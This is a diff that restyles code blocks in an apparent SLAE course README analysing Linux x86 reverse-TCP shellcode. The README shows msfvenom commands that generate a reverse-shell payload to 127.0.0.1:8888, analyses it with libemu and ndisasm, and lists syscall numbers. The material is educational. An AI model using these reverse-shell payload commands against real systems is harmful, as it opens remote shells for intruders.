@@ -28,8 +28,8 @@
 <br>
 <br>
 <h2> Usage</h2>
-<code><h4>python wrapper.py $IP $PORT
-</code></h4><br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">python wrapper.py $IP $PORT
+</code><br>
 
 <img src="https://github.com/ricardojoserf/slae/blob/master/a2_Shell_Reverse_Tcp/images/wrapper/2.png?raw=true"><br>
 <br>
@@ -52,15 +52,15 @@ If the port causes problems, a warning message will appear:<br>
 <br>
 <h2> First approach: Libemu</h2><br>
 After installing Libemu, we will use the sctest binary. We can get the result using the binary directly:<br>
-<code><h4>msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1 | ./sctest -vvv -Ss 10000 -G reverseshell.dot
-</code></h4>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1 | ./sctest -vvv -Ss 10000 -G reverseshell.dot
+</code>
 <br>
 Or we can use the libemu.sh script (in scripts/ folder):<br>
-<code><h4>sh libemu.sh "msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1" reverseshell | tee libemu_res/libemu_res.txt
-</code></h4>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">sh libemu.sh "msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1" reverseshell | tee libemu_res/libemu_res.txt
+</code>
 <br>
 The result:
-<code><h4>int socket (<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">int socket (<br>
 int domain = 2;<br>
 int type = 1;<br>
 int protocol = 0;<br>
@@ -103,15 +103,15 @@ none;<br>
 const char a ddos_simulation Desktop dit_instafollowers_bot.html Documents Downloads examples.desktop github-bot html-wrapper.py instagram-followers-bot Music NoSQL-injection-example Pictures Public pywisam ricardojruiz.herokuapp.com sc.sh slae snap spotify-playlist-downloader Templates triangle-position twitter-followers-bot users.txt user.txt Videos envp[] = 0x00000000 =><br>
 none;<br>
 ) = 0;<br>
-</code></h4><br>
+</code><br>
 Once we know the system calls or syscalls, the values used in them and the order, it is necessary to get the hexadecimal values for every syscall, using cat and printf to print the hexadecimal value:
 <br>
-<code><h4>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep listen <br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep listen <br>
 printf "%x\n" 363 <br>
-</code></h4><br>
+</code><br>
 Or the syscallhex.sh script (in scripts/ folder)<br>
-<code><h4>sh syscallhex.sh listen
-</code></h4><br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">sh syscallhex.sh listen
+</code><br>
 The system calls and their values are:<br>
 <br>
 - Socket:   359 (0x167)<br>
@@ -143,8 +143,8 @@ Now we know the value in the original shellcode which must be substituted. After
 <h2> Second approach: Ndisasm</h2><br>
 <br>
 A second approach, which can be considered easier, is to get the nasm file from the raw output from msfvenom:<br>
-<code><h4>msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8888 --platform=Linux -a x86 -f raw | ndisasm -u -
-</code></h4>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8888 --platform=Linux -a x86 -f raw | ndisasm -u -
+</code>
 <br>
 <img src="https://github.com/ricardojoserf/slae/blob/master/a2_Shell_Reverse_Tcp/images/4.png?raw=true"><br>
 <br>
